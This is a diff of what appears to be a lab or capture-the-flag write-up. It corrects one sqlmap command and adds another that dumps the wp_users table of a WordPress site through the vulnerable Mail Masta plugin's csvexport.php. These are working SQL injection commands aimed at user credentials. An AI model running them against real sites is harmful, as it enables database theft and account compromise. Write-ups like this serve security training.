@@ -244,7 +244,7 @@ Database: wordpress
 ```
 **List columns within "wp_users" table using SQLMap**
 ```
-sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -T wp_users --columns
 
 Database: wordpress
 Table: wp_users
@@ -266,6 +266,8 @@ Table: wp_users
 ```
 **Dump contents of "wp_users" table using SQLMap**
 ```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -T wp_users --dump
+
 Database: wordpress
 Table: wp_users
 [1 entry]
